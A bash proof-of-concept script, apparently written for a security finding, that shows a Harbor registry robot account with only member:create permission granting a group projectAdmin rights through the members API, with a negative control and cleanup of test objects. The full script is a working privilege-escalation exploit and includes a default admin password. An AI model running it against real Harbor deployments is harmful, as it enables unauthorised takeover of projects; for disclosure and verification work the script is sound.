#!/usr/bin/env bash
set -euo pipefail

# Safe PoC for #49 finding 2:
# A project robot with only member:create can assign role_id=1 (projectAdmin).
# Creates throwaway project/group/robot/member and cleans them by exact IDs.

HARBOR_URL="${HARBOR_URL:-http://127.0.0.1:8080}"
ADMIN_USER="${ADMIN_USER:-admin}"
ADMIN_PASS="${ADMIN_PASS:-Harbor12345}"
STAMP="$(date +%s)"
PROJECT="sectest-49-$STAMP"
GROUP="sectest-49-group-$STAMP"

need() {
  command -v "$1" >/dev/null || {
    echo "missing dependency: $1" >&2
    exit 1
  }
}

need curl
need jq

api_admin() {
  curl -ksS -u "$ADMIN_USER:$ADMIN_PASS" "$@"
}

robot_id=""
group_id=""
member_id=""

cleanup() {
  if [[ -n "$member_id" ]]; then
    api_admin -o /dev/null -w "%{http_code}" \
      -X DELETE "$HARBOR_URL/api/v2.0/projects/$PROJECT/members/$member_id" >/dev/null || true
  fi
  if [[ -n "$robot_id" ]]; then
    api_admin -o /dev/null -w "%{http_code}" \
      -X DELETE "$HARBOR_URL/api/v2.0/robots/$robot_id" >/dev/null || true
  fi
  if [[ -n "$group_id" ]]; then
    api_admin -o /dev/null -w "%{http_code}" \
      -X DELETE "$HARBOR_URL/api/v2.0/usergroups/$group_id" >/dev/null || true
  fi
  api_admin -o /dev/null -w "%{http_code}" \
    -X DELETE "$HARBOR_URL/api/v2.0/projects/$PROJECT" >/dev/null || true
}
trap cleanup EXIT

echo "creating project $PROJECT"
api_admin -o /dev/null -w "%{http_code}" \
  -X POST "$HARBOR_URL/api/v2.0/projects" \
  -H 'Content-Type: application/json' \
  -d "{\"project_name\":\"$PROJECT\",\"public\":false,\"metadata\":{\"public\":\"false\"}}" | grep -Eq '201|409'

echo "creating user group $GROUP"
group_headers="$(mktemp)"
api_admin -D "$group_headers" -o /dev/null -w "%{http_code}" \
  -X POST "$HARBOR_URL/api/v2.0/usergroups" \
  -H 'Content-Type: application/json' \
  -d "{\"group_name\":\"$GROUP\",\"group_type\":2}" | grep -q 201
group_id="$(awk -F/ 'tolower($1)=="location:" {gsub("\r","",$NF); print $NF}' "$group_headers" | tail -1)"
rm -f "$group_headers"

echo "creating project robot with member:create only"
robot_json="$(
  api_admin -X POST "$HARBOR_URL/api/v2.0/robots" \
    -H 'Content-Type: application/json' \
    -d @- <<JSON
{
  "name": "sectest49-membercreate-$STAMP",
  "level": "project",
  "duration": 1,
  "disable": false,
  "permissions": [{
    "kind": "project",
    "namespace": "$PROJECT",
    "access": [{
      "resource": "member",
      "action": "create",
      "effect": "allow"
    }]
  }]
}
JSON
)"
robot_id="$(jq -r '.id' <<<"$robot_json")"
robot_name="$(jq -r '.name' <<<"$robot_json")"
robot_secret="$(jq -r '.secret' <<<"$robot_json")"

echo "negative control: robot should not have projectAdmin powers"
control_code="$(
  curl -ksS -u "$robot_name:$robot_secret" \
    -o /tmp/poc49-control-body.$$ -w "%{http_code}" \
    -X POST "$HARBOR_URL/api/v2.0/robots" \
    -H 'Content-Type: application/json' \
    -d "{\"name\":\"sectest49-control-$STAMP\",\"level\":\"project\",\"duration\":1,\"permissions\":[{\"kind\":\"project\",\"namespace\":\"$PROJECT\",\"access\":[{\"resource\":\"repository\",\"action\":\"pull\",\"effect\":\"allow\"}]}]}"
)"
rm -f /tmp/poc49-control-body.$$
echo "robot:create control -> HTTP $control_code"

echo "exploit: member:create robot adds group as role_id=1 projectAdmin"
member_headers="$(mktemp)"
member_body="$(mktemp)"
member_code="$(
  curl -ksS -u "$robot_name:$robot_secret" \
    -D "$member_headers" -o "$member_body" -w "%{http_code}" \
    -X POST "$HARBOR_URL/api/v2.0/projects/$PROJECT/members" \
    -H 'Content-Type: application/json' \
    -d "{\"role_id\":1,\"member_group\":{\"id\":$group_id,\"group_name\":\"$GROUP\",\"group_type\":2}}"
)"
member_id="$(awk -F/ 'tolower($1)=="location:" {gsub("\r","",$NF); print $NF}' "$member_headers" | tail -1)"
rm -f "$member_headers"

echo "member create -> HTTP $member_code member_id=$member_id"
cat "$member_body"
echo
rm -f "$member_body"

verify="$(api_admin "$HARBOR_URL/api/v2.0/projects/$PROJECT/members/$member_id")"
echo "$verify" | jq .

role_id="$(jq -r '.role_id' <<<"$verify")"
role_name="$(jq -r '.role_name' <<<"$verify")"

if [[ "$control_code" == "403" && "$member_code" == "201" && "$role_id" == "1" ]]; then
  echo "VULNERABLE: member:create-only robot assigned $GROUP as $role_name."
else
  echo "NOT CONFIRMED: expected control 403, member create 201, role_id 1." >&2
  exit 2
fi
